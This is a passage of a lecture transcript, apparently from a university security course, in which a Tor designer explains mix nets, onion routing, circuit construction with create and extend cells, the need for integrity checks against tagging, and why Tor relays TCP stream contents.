              <time_slice>21:58</time_slice>
              <text_slice>received a large number of
requests, just [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>22:00</time_slice>
              <text_slice>up all the requests
they got for an hour,</text_slice>
            </slice>
            <slice>
              <time_slice>22:03</time_slice>
              <text_slice>reordered them, and
transmitted them all at once.</text_slice>
            </slice>
            <slice>
              <time_slice>22:06</time_slice>
              <text_slice>And you could also say all
requests must be the same size.</text_slice>
            </slice>
            <slice>
              <time_slice>22:10</time_slice>
              <text_slice>Requests are 1k,
responses are 1 megabyte.</text_slice>
            </slice>
            <slice>
              <time_slice>22:13</time_slice>
              <text_slice>And with some more
work on that, we</text_slice>
            </slice>
            <slice>
              <time_slice>22:15</time_slice>
              <text_slice>get something that would let you
send an email that would arrive</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>in order of hours, or get a web
page in order of to end time,</text_slice>
            </slice>
            <slice>
              <time_slice>22:29</time_slice>
              <text_slice>assuming that you optimize
it to a single round trip.</text_slice>
            </slice>
            <slice>
              <time_slice>22:32</time_slice>
              <text_slice>These systems exist, and existed
when we started doing Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>22:36</time_slice>
              <text_slice>They don't get a
lot of use, though.</text_slice>
            </slice>
            <slice>
              <time_slice>22:38</time_slice>
              <text_slice>I actually wrote
one called Mixminion</text_slice>
            </slice>
            <slice>
              <time_slice>22:40</time_slice>
              <text_slice>that was a successor to
the Mixmaster remailer.</text_slice>
            </slice>
            <slice>
              <time_slice>22:44</time_slice>
              <text_slice>I have not gotten a remailer
message in the last three</text_slice>
            </slice>
            <slice>
              <time_slice>22:46</time_slice>
              <text_slice>years.</text_slice>
            </slice>
            <slice>
              <time_slice>22:49</time_slice>
              <text_slice>Tor has billions of users.</text_slice>
            </slice>
            <slice>
              <time_slice>22:51</time_slice>
              <text_slice>Remailers, it's unclear
whether they've got more than</text_slice>
            </slice>
            <slice>
              <time_slice>22:54</time_slice>
              <text_slice>on the order of hundreds.</text_slice>
            </slice>
            <slice>
              <time_slice>22:55</time_slice>
              <text_slice>So you might think,
well, still though, it's</text_slice>
            </slice>
            <slice>
              <time_slice>22:57</time_slice>
              <text_slice>better anonymity for the
people who really need it.</text_slice>
            </slice>
            <slice>
              <time_slice>22:59</time_slice>
              <text_slice>Except if you've only got on
the order of hundreds of users,</text_slice>
            </slice>
            <slice>
              <time_slice>23:03</time_slice>
              <text_slice>then you're not
really providing them</text_slice>
            </slice>
            <slice>
              <time_slice>23:05</time_slice>
              <text_slice>all that much anonymity against
this kind of adversary anyway.</text_slice>
            </slice>
            <slice>
              <time_slice>23:08</time_slice>
              <text_slice>Because this adversary
can simply go,</text_slice>
            </slice>
            <slice>
              <time_slice>23:10</time_slice>
              <text_slice>OK, there's 100 people.</text_slice>
            </slice>
            <slice>
              <time_slice>23:12</time_slice>
              <text_slice>Well, the message I
want to investigate</text_slice>
            </slice>
            <slice>
              <time_slice>23:14</time_slice>
              <text_slice>was looking at a
Bulgarian website.</text_slice>
            </slice>
            <slice>
              <time_slice>23:15</time_slice>
              <text_slice>How many of them
speak Bulgarian?</text_slice>
            </slice>
            <slice>
              <time_slice>23:17</time_slice>
              <text_slice>OK, that's five.</text_slice>
            </slice>
            <slice>
              <time_slice>23:20</time_slice>
              <text_slice>The saying is,
anonymity loves company.</text_slice>
            </slice>
            <slice>
              <time_slice>23:22</time_slice>
              <text_slice>Unless you have a
large user base,</text_slice>
            </slice>
            <slice>
              <time_slice>23:25</time_slice>
              <text_slice>no system can actually
provide anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>23:28</time_slice>
              <text_slice>And that's why also in this
design, if these Alices all</text_slice>
            </slice>
            <slice>
              <time_slice>23:31</time_slice>
              <text_slice>belong to an
organization, they ought</text_slice>
            </slice>
            <slice>
              <time_slice>23:33</time_slice>
              <text_slice>to have a shared public system
rather than a private one.</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>If they all work for
MIT legal, and they're</text_slice>
            </slice>
            <slice>
              <time_slice>23:45</time_slice>
              <text_slice>investigating some
fake MIT website that's</text_slice>
            </slice>
            <slice>
              <time_slice>23:50</time_slice>
              <text_slice>offering fake diplomas,
then if they're just</text_slice>
            </slice>
            <slice>
              <time_slice>23:54</time_slice>
              <text_slice>using the MIT legal anonymizer,
then it's not really</text_slice>
            </slice>
            <slice>
              <time_slice>23:58</time_slice>
              <text_slice>concealing who they are.</text_slice>
            </slice>
            <slice>
              <time_slice>24:00</time_slice>
              <text_slice>But if you have a large
number of different parties</text_slice>
            </slice>
            <slice>
              <time_slice>24:02</time_slice>
              <text_slice>all using this, then it actually
can provide some privacy.</text_slice>
            </slice>
            <slice>
              <time_slice>24:06</time_slice>
              <text_slice>So we'll return one more time
to resisting these correlation</text_slice>
            </slice>
            <slice>
              <time_slice>24:13</time_slice>
              <text_slice>attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>24:14</time_slice>
              <text_slice>But for now let's say that we're
not resisting these correlation</text_slice>
            </slice>
            <slice>
              <time_slice>24:16</time_slice>
              <text_slice>attacks.</text_slice>
            </slice>
            <slice>
              <time_slice>24:17</time_slice>
              <text_slice>And instead, we assume that
an attacker who sees both ends</text_slice>
            </slice>
            <slice>
              <time_slice>24:23</time_slice>
              <text_slice>wins, and we're trying to
minimize the probability</text_slice>
            </slice>
            <slice>
              <time_slice>24:25</time_slice>
              <text_slice>that that happens over time.</text_slice>
            </slice>
            <slice>
              <time_slice>24:28</time_slice>
              <text_slice>All right, so I've just
talked about message passing.</text_slice>
            </slice>
            <slice>
              <time_slice>24:35</time_slice>
              <text_slice>The way you would build that
with something like a mix net</text_slice>
            </slice>
            <slice>
              <time_slice>24:37</time_slice>
              <text_slice>is you give each of these relays
a public key-- K3, K2, K1.</text_slice>
            </slice>
            <slice>
              <time_slice>24:45</time_slice>
              <text_slice>And when Alice wants to
send something through here,</text_slice>
            </slice>
            <slice>
              <time_slice>24:48</time_slice>
              <text_slice>she would say, encrypt
with K3, socks,</text_slice>
            </slice>
            <slice>
              <time_slice>24:55</time_slice>
              <text_slice>and then encrypt
that with K2-- I'm</text_slice>
            </slice>
            <slice>
              <time_slice>24:59</time_slice>
              <text_slice>leaving off writing
information for now--</text_slice>
            </slice>
            <slice>
              <time_slice>25:01</time_slice>
              <text_slice>and then encrypt with K1.</text_slice>
            </slice>
            <slice>
              <time_slice>25:04</time_slice>
              <text_slice>But public key, as
you know, is kind</text_slice>
            </slice>
            <slice>
              <time_slice>25:05</time_slice>
              <text_slice>of expensive enough that you
don't want to use it for bulk</text_slice>
            </slice>
            <slice>
              <time_slice>25:08</time_slice>
              <text_slice>traffic.</text_slice>
            </slice>
            <slice>
              <time_slice>25:10</time_slice>
              <text_slice>So instead what you
do is you negotiate</text_slice>
            </slice>
            <slice>
              <time_slice>25:17</time_slice>
              <text_slice>a set of keys with each server.</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>So Alice shares a symmetric
key with this relay,</text_slice>
            </slice>
            <slice>
              <time_slice>25:23</time_slice>
              <text_slice>a different symmetric
key with this relay,</text_slice>
            </slice>
            <slice>
              <time_slice>25:25</time_slice>
              <text_slice>and a different symmetric key
with this relay associated</text_slice>
            </slice>
            <slice>
              <time_slice>25:28</time_slice>
              <text_slice>in what we call a circuit, which
is a path through the network.</text_slice>
            </slice>
            <slice>
              <time_slice>25:32</time_slice>
              <text_slice>And after the initial public key
is set up to create those keys,</text_slice>
            </slice>
            <slice>
              <time_slice>25:38</time_slice>
              <text_slice>Alice can then use
symmetric crypto</text_slice>
            </slice>
            <slice>
              <time_slice>25:40</time_slice>
              <text_slice>to send stuff
through the network.</text_slice>
            </slice>
            <slice>
              <time_slice>25:41</time_slice>
              <text_slice>If you stop at that
point, then you</text_slice>
            </slice>
            <slice>
              <time_slice>25:43</time_slice>
              <text_slice>have onion routing as it
was designed in the 1990s</text_slice>
            </slice>
            <slice>
              <time_slice>25:47</time_slice>
              <text_slice>by Syverson,
Goldschlag, and Reed.</text_slice>
            </slice>
            <slice>
              <time_slice>25:51</time_slice>
              <text_slice>And I hope I get
the names right.</text_slice>
            </slice>
            <slice>
              <time_slice>25:54</time_slice>
              <text_slice>Paul Syverson is still active.</text_slice>
            </slice>
            <slice>
              <time_slice>25:56</time_slice>
              <text_slice>The other two are
working on other things.</text_slice>
            </slice>
            <slice>
              <time_slice>25:59</time_slice>
              <text_slice>Also, once you've added circuits
like that, medium term paths</text_slice>
            </slice>
            <slice>
              <time_slice>26:03</time_slice>
              <text_slice>through the network, you can
have an easy reply channel</text_slice>
            </slice>
            <slice>
              <time_slice>26:06</time_slice>
              <text_slice>where things sent
back this way get</text_slice>
            </slice>
            <slice>
              <time_slice>26:09</time_slice>
              <text_slice>to Alice being encrypted at
each step instead of decrypted</text_slice>
            </slice>
            <slice>
              <time_slice>26:13</time_slice>
              <text_slice>at each step.</text_slice>
            </slice>
            <slice>
              <time_slice>26:15</time_slice>
              <text_slice>And of course you need some
kind of integrity checking,</text_slice>
            </slice>
            <slice>
              <time_slice>26:21</time_slice>
              <text_slice>either node by
node or end to end.</text_slice>
            </slice>
            <slice>
              <time_slice>26:24</time_slice>
              <text_slice>Because if you don't
do integrity checking,</text_slice>
            </slice>
            <slice>
              <time_slice>26:26</time_slice>
              <text_slice>then-- well, let's say you're
using an XOR based stream</text_slice>
            </slice>
            <slice>
              <time_slice>26:31</time_slice>
              <text_slice>cypher for your encryption.</text_slice>
            </slice>
            <slice>
              <time_slice>26:33</time_slice>
              <text_slice>If you don't do
integrity checking,</text_slice>
            </slice>
            <slice>
              <time_slice>26:35</time_slice>
              <text_slice>then this node can XOR in
Alice, Alice, Alice, Alice,</text_slice>
            </slice>
            <slice>
              <time_slice>26:39</time_slice>
              <text_slice>Alice to the encrypted message.</text_slice>
            </slice>
            <slice>
              <time_slice>26:42</time_slice>
              <text_slice>And then when it's finally
decrypted over here,</text_slice>
            </slice>
            <slice>
              <time_slice>26:44</time_slice>
              <text_slice>because that's a
malleable crypto</text_slice>
            </slice>
            <slice>
              <time_slice>26:47</time_slice>
              <text_slice>scheme, if the same attacker is
controlling this node as well,</text_slice>
            </slice>
            <slice>
              <time_slice>26:56</time_slice>
              <text_slice>or if the attacker
is observing it here,</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>the attacker will see Alice,
Alice, Alice, Alice, Alice</text_slice>
            </slice>
            <slice>
              <time_slice>27:01</time_slice>
              <text_slice>XORed with a
reasonable plain text</text_slice>
            </slice>
            <slice>
              <time_slice>27:03</time_slice>
              <text_slice>and be able to use
that to identify,</text_slice>
            </slice>
            <slice>
              <time_slice>27:05</time_slice>
              <text_slice>ah, this is the stream
that came from Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>27:08</time_slice>
              <text_slice>So let's do a little more
about how the protocol works.</text_slice>
            </slice>
            <slice>
              <time_slice>27:12</time_slice>
              <text_slice>Because it would be a shame to
have everybody read the paper</text_slice>
            </slice>
            <slice>
              <time_slice>27:14</time_slice>
              <text_slice>and then not talk
about the stuff</text_slice>
            </slice>
            <slice>
              <time_slice>27:16</time_slice>
              <text_slice>that the paper is focused on.</text_slice>
            </slice>
            <slice>
              <time_slice>27:24</time_slice>
              <text_slice>Again, I apologize for
my blackboard technique.</text_slice>
            </slice>
            <slice>
              <time_slice>27:26</time_slice>
              <text_slice>Most of the time, I'm
sitting at home on a desktop.</text_slice>
            </slice>
            <slice>
              <time_slice>27:32</time_slice>
              <text_slice>This is alien tech.</text_slice>
            </slice>
            <slice>
              <time_slice>27:35</time_slice>
              <text_slice>So here's a relay.</text_slice>
            </slice>
            <slice>
              <time_slice>27:38</time_slice>
              <text_slice>Here's Alice.</text_slice>
            </slice>
            <slice>
              <time_slice>27:41</time_slice>
              <text_slice>Here's another relay.</text_slice>
            </slice>
            <slice>
              <time_slice>27:43</time_slice>
              <text_slice>Here's Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>27:44</time_slice>
              <text_slice>Now Alice wants to talk to Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>27:48</time_slice>
              <text_slice>So first thing Alice has
to do is build a circuit</text_slice>
            </slice>
            <slice>
              <time_slice>27:52</time_slice>
              <text_slice>through these relays to Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>27:55</time_slice>
              <text_slice>Let's say she's picked
these two, R1 and R2.</text_slice>
            </slice>
            <slice>
              <time_slice>27:59</time_slice>
              <text_slice>So Alice first makes
a TLS link to R1.</text_slice>
            </slice>
            <slice>
              <time_slice>28:08</time_slice>
              <text_slice>R1, let's say, already
has a TLS link to R2.</text_slice>
            </slice>
            <slice>
              <time_slice>28:13</time_slice>
              <text_slice>First thing Alice
does is she does</text_slice>
            </slice>
            <slice>
              <time_slice>28:16</time_slice>
              <text_slice>a one-way authenticated one-way
anonymous key negotiation.</text_slice>
            </slice>
            <slice>
              <time_slice>28:25</time_slice>
              <text_slice>The old one in
Tor is called TAP.</text_slice>
            </slice>
            <slice>
              <time_slice>28:28</time_slice>
              <text_slice>The new one is called NTor.</text_slice>
            </slice>
            <slice>
              <time_slice>28:30</time_slice>
              <text_slice>They both have proofs.</text_slice>
            </slice>
            <slice>
              <time_slice>28:35</time_slice>
              <text_slice>They both even have
correct proofs,</text_slice>
            </slice>
            <slice>
              <time_slice>28:36</time_slice>
              <text_slice>although the original proof
in the paper had a flaw in it.</text_slice>
            </slice>
            <slice>
              <time_slice>28:41</time_slice>
              <text_slice>But when that's done,
she sends a create cell.</text_slice>
            </slice>
            <slice>
              <time_slice>28:45</time_slice>
              <text_slice>And she picks a circuit ID.</text_slice>
            </slice>
            <slice>
              <time_slice>28:47</time_slice>
              <text_slice>Let's say she picks
3, and says, create 3.</text_slice>
            </slice>
            <slice>
              <time_slice>28:54</time_slice>
              <text_slice>The relay says, created.</text_slice>
            </slice>
            <slice>
              <time_slice>29:00</time_slice>
              <text_slice>And now R1 and Alice share a
secret key, a symmetric key,</text_slice>
            </slice>
            <slice>
              <time_slice>29:05</time_slice>
              <text_slice>which they're going to call S1.</text_slice>
            </slice>
            <slice>
              <time_slice>29:10</time_slice>
              <text_slice>And they both have this stored
as 3 with respect to this link.</text_slice>
            </slice>
            <slice>
              <time_slice>29:19</time_slice>
              <text_slice>Now Alice can use that key
to send messages to R1.</text_slice>
            </slice>
            <slice>
              <time_slice>29:23</time_slice>
              <text_slice>So she says, on 3-- that's
the circuit ID that everything</text_slice>
            </slice>
            <slice>
              <time_slice>29:27</time_slice>
              <text_slice>was talking about in the
paper-- send a relay extend</text_slice>
            </slice>
            <slice>
              <time_slice>29:38</time_slice>
              <text_slice>with some contents.</text_slice>
            </slice>
            <slice>
              <time_slice>29:41</time_slice>
              <text_slice>The extend cell basically
contains the first half</text_slice>
            </slice>
            <slice>
              <time_slice>29:44</time_slice>
              <text_slice>of the create handshake.</text_slice>
            </slice>
            <slice>
              <time_slice>29:47</time_slice>
              <text_slice>But this time, it's not
encrypted with R1's public key.</text_slice>
            </slice>
            <slice>
              <time_slice>29:50</time_slice>
              <text_slice>It's encrypted with
R2's public key.</text_slice>
            </slice>
            <slice>
              <time_slice>29:53</time_slice>
              <text_slice>And it also says, and
this one goes to R2.</text_slice>
            </slice>
            <slice>
              <time_slice>29:56</time_slice>
              <text_slice>So R1 knows to open a new
circuit to R2, and says,</text_slice>
            </slice>
            <slice>
              <time_slice>30:01</time_slice>
              <text_slice>create.</text_slice>
            </slice>
            <slice>
              <time_slice>30:05</time_slice>
              <text_slice>And it passes the initial
part of the handshake</text_slice>
            </slice>
            <slice>
              <time_slice>30:09</time_slice>
              <text_slice>as it came from Alice along.</text_slice>
            </slice>
            <slice>
              <time_slice>30:12</time_slice>
              <text_slice>And it picks its own circuit ID.</text_slice>
            </slice>
            <slice>
              <time_slice>30:14</time_slice>
              <text_slice>Because circuit IDs identify
the different circuits</text_slice>
            </slice>
            <slice>
              <time_slice>30:17</time_slice>
              <text_slice>on this TLS connection.</text_slice>
            </slice>
            <slice>
              <time_slice>30:19</time_slice>
              <text_slice>And Alice doesn't know
what other circuit</text_slice>
            </slice>
            <slice>
              <time_slice>30:20</time_slice>
              <text_slice>IDs are in use on this one.</text_slice>
            </slice>
            <slice>
              <time_slice>30:22</time_slice>
              <text_slice>Because this one is
private to R1 and R2.</text_slice>
            </slice>
            <slice>
              <time_slice>30:24</time_slice>
              <text_slice>So it might pick 95.</text_slice>
            </slice>
            <slice>
              <time_slice>30:28</time_slice>
              <text_slice>It actually is very
unlikely to pick that,</text_slice>
            </slice>
            <slice>
              <time_slice>30:30</time_slice>
              <text_slice>because they're randomly
chosen from a 4 byte space.</text_slice>
            </slice>
            <slice>
              <time_slice>30:36</time_slice>
              <text_slice>But I don't want to write
out any 32-bit numbers today.</text_slice>
            </slice>
            <slice>
              <time_slice>30:40</time_slice>
              <text_slice>And this says,
created in response.</text_slice>
            </slice>
            <slice>
              <time_slice>30:43</time_slice>
              <text_slice>So this one sends back an
extended encrypted with S1.</text_slice>
            </slice>
            <slice>
              <time_slice>30:48</time_slice>
              <text_slice>And now Alice and
relay share S2.</text_slice>
            </slice>
            <slice>
              <time_slice>30:58</time_slice>
              <text_slice>So now Alice can send
messages encrypted</text_slice>
            </slice>
            <slice>
              <time_slice>31:01</time_slice>
              <text_slice>first with S2, and then
with S1 as relay cells.</text_slice>
            </slice>
            <slice>
              <time_slice>31:06</time_slice>
              <text_slice>So she sends a
message like that.</text_slice>
            </slice>
            <slice>
              <time_slice>31:08</time_slice>
              <text_slice>R1 removes the S1 encryption
and forwards it on.</text_slice>
            </slice>
            <slice>
              <time_slice>31:12</time_slice>
              <text_slice>It says, OK, it came
in on circuit 3.</text_slice>
            </slice>
            <slice>
              <time_slice>31:17</time_slice>
              <text_slice>I know that 3 goes
to 95 on this one.</text_slice>
            </slice>
            <slice>
              <time_slice>31:20</time_slice>
              <text_slice>So I send it on 95.</text_slice>
            </slice>
            <slice>
              <time_slice>31:23</time_slice>
              <text_slice>And I say whatever I
got after decrypting.</text_slice>
            </slice>
            <slice>
              <time_slice>31:25</time_slice>
              <text_slice>OK, and this one says,
ah, I came on 95.</text_slice>
            </slice>
            <slice>
              <time_slice>31:28</time_slice>
              <text_slice>95 corresponds to
the shared key S2.</text_slice>
            </slice>
            <slice>
              <time_slice>31:33</time_slice>
              <text_slice>So I'll decrypt with that.</text_slice>
            </slice>
            <slice>
              <time_slice>31:34</time_slice>
              <text_slice>Oh, that says, open
a connection to Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>31:38</time_slice>
              <text_slice>And relay 2 opens a
TCP connection to Bob</text_slice>
            </slice>
            <slice>
              <time_slice>31:41</time_slice>
              <text_slice>and tells Alice that it did
it through the same process.</text_slice>
            </slice>
            <slice>
              <time_slice>31:45</time_slice>
              <text_slice>And Alice says, great.</text_slice>
            </slice>
            <slice>
              <time_slice>31:47</time_slice>
              <text_slice>Tell Bob http 10 get/index.html,
and the world goes on.</text_slice>
            </slice>
            <slice>
              <time_slice>31:58</time_slice>
              <text_slice>Let's see, what did I leave out?</text_slice>
            </slice>
            <slice>
              <time_slice>32:00</time_slice>
              <text_slice>I'll skip that, skip
that, skip that.</text_slice>
            </slice>
            <slice>
              <time_slice>32:03</time_slice>
              <text_slice>So what do we actually relay?</text_slice>
            </slice>
            <slice>
              <time_slice>32:04</time_slice>
              <text_slice>Some designs in this area
say, well, you should</text_slice>
            </slice>
            <slice>
              <time_slice>32:07</time_slice>
              <text_slice>send IP packets back and forth.</text_slice>
            </slice>
            <slice>
              <time_slice>32:08</time_slice>
              <text_slice>This should just be a way
to transmit IP packets.</text_slice>
            </slice>
            <slice>
              <time_slice>32:12</time_slice>
              <text_slice>One of the problems
with that is we</text_slice>
            </slice>
            <slice>
              <time_slice>32:15</time_slice>
              <text_slice>want to support as many
users as possible, which</text_slice>
            </slice>
            <slice>
              <time_slice>32:19</time_slice>
              <text_slice>means we have to run on all
kinds of operating systems.</text_slice>
            </slice>
            <slice>
              <time_slice>32:21</time_slice>
              <text_slice>And operating system
TCP stacks do not</text_slice>
            </slice>
            <slice>
              <time_slice>32:23</time_slice>
              <text_slice>act anything like each other.</text_slice>
            </slice>
            <slice>
              <time_slice>32:26</time_slice>
              <text_slice>If you've ever used
Nmap, or if you've ever</text_slice>
            </slice>
            <slice>
              <time_slice>32:27</time_slice>
              <text_slice>used any kind of network
traffic analysis tool,</text_slice>
            </slice>
            <slice>
              <time_slice>32:30</time_slice>
              <text_slice>you can trivially tell
Windows TCP from FreeBSD</text_slice>
            </slice>
            <slice>
              <time_slice>32:34</time_slice>
              <text_slice>from Linux TCP.</text_slice>
            </slice>
            <slice>
              <time_slice>32:36</time_slice>
              <text_slice>And you can even tell
different versions apart.</text_slice>
            </slice>
            <slice>
              <time_slice>32:38</time_slice>
              <text_slice>And moreover, if you
can send raw IP packets</text_slice>
            </slice>
            <slice>
              <time_slice>32:41</time_slice>
              <text_slice>to a chosen host,
you can provoke</text_slice>
            </slice>
            <slice>
              <time_slice>32:45</time_slice>
              <text_slice>different responses
in part based</text_slice>
            </slice>
            <slice>
              <time_slice>32:49</time_slice>
              <text_slice>on what the host is doing.</text_slice>
            </slice>
            <slice>
              <time_slice>32:51</time_slice>
              <text_slice>So if you're doing
IP, you would actually</text_slice>
            </slice>
            <slice>
              <time_slice>32:53</time_slice>
              <text_slice>need an IP normalization
layer if IP is what</text_slice>
            </slice>
            <slice>
              <time_slice>32:55</time_slice>
              <text_slice>you transport back and forth.</text_slice>
            </slice>
            <slice>
              <time_slice>32:58</time_slice>
              <text_slice>And it seems that anything less
than a full IP stack is not</text_slice>
            </slice>
            <slice>
              <time_slice>33:03</time_slice>
              <text_slice>actually going to work
for IP normalization.</text_slice>
            </slice>
            <slice>
              <time_slice>33:07</time_slice>
              <text_slice>So you wouldn't want to do that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:10</time_slice>
              <text_slice>Instead, what we just chose
is-- and this is largely</text_slice>
            </slice>
            <slice>
              <time_slice>33:13</time_slice>
              <text_slice>because this is the
easiest way-- you take</text_slice>
            </slice>
            <slice>
              <time_slice>33:15</time_slice>
              <text_slice>the contents of TCP streams.</text_slice>
            </slice>
            <slice>
              <time_slice>33:18</time_slice>
              <text_slice>So you just assume
each of these things</text_slice>
            </slice>
            <slice>
              <time_slice>33:25</time_slice>
              <text_slice>is reliable and in order.</text_slice>
            </slice>
            <slice>
              <time_slice>33:27</time_slice>
              <text_slice>You have the computer analysis
end, the program analysis</text_slice>
            </slice>
            <slice>
              <time_slice>33:31</time_slice>
              <text_slice>running to do all
this stuff for her,</text_slice>
            </slice>
            <slice>
              <time_slice>33:35</time_slice>
              <text_slice>accept TCP connections
from Alice's applications,</text_slice>
            </slice>
            <slice>
              <time_slice>33:38</time_slice>
              <text_slice>and then just relay
their contents</text_slice>
            </slice>
            <slice>
              <time_slice>33:40</time_slice>
              <text_slice>and don't do anything
trickier on the network level.</text_slice>
            </slice>
            <slice>
              <time_slice>33:44</time_slice>
              <text_slice>You might be able to
get better performance</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>by trying some other means.</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>And there are some
papers examining</text_slice>
            </slice>
            <slice>
              <time_slice>33:48</time_slice>
              <text_slice>how you would do that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:49</time_slice>
              <text_slice>But this is the one that we
could actually implement.</text_slice>
            </slice>
            <slice>
              <time_slice>33:52</time_slice>
              <text_slice>Because we paid a
lot more attention</text_slice>
            </slice>
            <slice>
              <time_slice>33:54</time_slice>
              <text_slice>in security and
compilers classes than we</text_slice>
            </slice>
            <slice>
              <time_slice>33:56</time_slice>
              <text_slice>did in networking classes.</text_slice>
            </slice>
            <slice>
              <time_slice>33:58</time_slice>
              <text_slice>Now we have networking people.</text_slice>
            </slice>
            <slice>
              <time_slice>34:00</time_slice>
              <text_slice>But in 2003, 2004, we did not
have any networking experts.</text_slice>
            </slice>
            <slice>
              <time_slice>34:07</time_slice>
              <text_slice>TCP also seems like
the right level.</text_slice>
            </slice>
            <slice>
              <time_slice>34:09</time_slice>
              <text_slice>Higher level
protocols-- like in some</text_slice>
            </slice>
            <slice>
              <time_slice>34:11</time_slice>
              <text_slice>of the original
[INAUDIBLE] designs,</text_slice>
            </slice>
            <slice>
              <time_slice>34:13</time_slice>
              <text_slice>there were separate proxies
at this end for HTTP,</text_slice>
            </slice>
            <slice>
              <time_slice>34:16</time_slice>
              <text_slice>for FTP, and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>34:19</time_slice>
              <text_slice>That seems to be
mostly a bad idea.</text_slice>
            </slice>
            <slice>
              <time_slice>34:21</time_slice>
              <text_slice>Because any
interesting protocol is</text_slice>
            </slice>
            <slice>
              <time_slice>34:24</time_slice>
              <text_slice>going to have end to end
encryption from Alice</text_slice>
            </slice>
            <slice>
              <time_slice>34:26</time_slice>
              <text_slice>all the way to Bob.</text_slice>
            </slice>
            <slice>
              <time_slice>34:28</time_slice>
              <text_slice>That is if we're lucky, Alice
is doing a TLS connection</text_slice>
            </slice>
            <slice>
              <time_slice>34:32</time_slice>
              <text_slice>over this to Bob so that TLS
properties get her integrity</text_slice>
            </slice>
            <slice>
              <time_slice>34:40</time_slice>
              <text_slice>and secrecy.</text_slice>
            </slice>
            <slice>
              <time_slice>34:44</time_slice>
              <text_slice>But if that's the case,
then any kind anonymizing</text_slice>
            </slice>
            <slice>
              <time_slice>34:46</time_slice>
              <text_slice>transformations you want to
apply to the encrypted data</text_slice>
            </slice>
            <slice>
              <time_slice>34:50</time_slice>
              <text_slice>need to happen in
the application</text_slice>
            </slice>
            <slice>
              <time_slice>34:53</time_slice>
              <text_slice>Alice is using before
the TLS happens entirely.</text_slice>
            </slice>
            <slice>
              <time_slice>34:56</time_slice>
              <text_slice>So you can't really
do that in a proxy.</text_slice>
            </slice>
            <slice>
              <time_slice>34:58</time_slice>
              <text_slice>And that's kind of
why we came out to,</text_slice>
            </slice>
            <slice>
              <time_slice>35:00</time_slice>
              <text_slice>OK, the sweet spot
is TCP contents.</text_slice>
            </slice>
            <slice>
              <time_slice>35:03</time_slice>
              <text_slice>Somebody asked me, OK, but
where are your security proofs?</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>We do have security proofs for a
lot of the cryptography that we</text_slice>
            </slice>
            <slice>
              <time_slice>35:11</time_slice>
              <text_slice>use, standard reductions.</text_slice>
            </slice>
            <slice>
              <time_slice>35:15</time_slice>
              <text_slice>For the protocol
as a whole, there</text_slice>
            </slice>
            <slice>
              <time_slice>35:19</time_slice>
              <text_slice>are proofs in the field about
certain aspects of onion</text_slice>
            </slice>
            <slice>
              <time_slice>35:23</time_slice>
              <text_slice>routing.</text_slice>
            </slice>
            <slice>
              <time_slice>35:23</time_slice>
              <text_slice>But the models that they
have to use in order</text_slice>
            </slice>
            <slice>
              <time_slice>35:27</time_slice>
              <text_slice>to prove that this
provides anonymity</text_slice>
            </slice>
            <slice>
              <time_slice>35:31</time_slice>
              <text_slice>make assumptions about
the universe, the network,</text_slice>
            </slice>
            <slice>
              <time_slice>35:36</time_slice>
              <text_slice>or the attacker's abilities
that are so weird as</text_slice>
            </slice>
            <slice>
              <time_slice>35:41</time_slice>
              <text_slice>to satisfy no one but certain
program committees of more</text_slice>
            </slice>
            <slice>
              <time_slice>35:45</time_slice>
              <text_slice>theoretical conferences.</text_slice>
            </slice>
            <slice>
              <time_slice>35:49</time_slice>
              <text_slice>The kind of things you can prove
is that an attacker who sees</text_slice>
            </slice>
            <slice>
              <time_slice>35:54</time_slice>
              <text_slice>this, who sees a number of
strings here all of equal</text_slice>
            </slice>
            <slice>
              <time_slice>36:02</time_slice>
              <text_slice>volume and equal timing, cannot
tell which one goes to which</text_slice>
            </slice>
            <slice>
              <time_slice>36:07</time_slice>
              <text_slice>Bob simply by looking
at the bytes coming out.</text_slice>
            </slice>
            <slice>
              <time_slice>36:11</time_slice>
              <text_slice>But that's hardly
a useful result.</text_slice>
            </slice>
            <slice>
              <time_slice>36:14</time_slice>
              <text_slice>Also, the kind of guarantee you
can get from anonymity systems</text_slice>
            </slice>
            <slice>
              <time_slice>36:17</time_slice>
              <text_slice>that we know how to
build today-- OK,</text_slice>
            </slice>
            <slice>
              <time_slice>36:20</time_slice>
              <text_slice>I should be careful here.</text_slice>
            </slice>
            <slice>
              <time_slice>36:21</time_slice>
              <text_slice>There are some where you
have very strong guarantees</text_slice>
            </slice>
            <slice>
              <time_slice>36:24</time_slice>
              <text_slice>that we do know how to
build that you would never</text_slice>
            </slice>
            <slice>
              <time_slice>36:26</time_slice>
              <text_slice>actually want to use.</text_slice>
            </slice>
            <slice>
              <time_slice>36:28</time_slice>
              <text_slice>Like classical
[INAUDIBLE] DC-nets,</text_slice>
            </slice>
            <slice>
              <time_slice>36:32</time_slice>
              <text_slice>for instance, provide
guaranteed anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>36:35</time_slice>
              <text_slice>Except any participant can
shut down the whole network</text_slice>
            </slice>
            <slice>
              <time_slice>36:37</time_slice>
              <text_slice>by not participating.</text_slice>
            </slice>
            <slice>
              <time_slice>36:39</time_slice>
              <text_slice>That does not scale.</text_slice>
            </slice>
            <slice>
              <time_slice>36:41</time_slice>
              <text_slice>But for the things
that we do want</text_slice>
            </slice>
            <slice>
              <time_slice>36:42</time_slice>
              <text_slice>to build these days,
for the most part,</text_slice>
            </slice>
            <slice>
              <time_slice>36:46</time_slice>
              <text_slice>the anonymity properties
are probabilistic rather</text_slice>
            </slice>
            <slice>
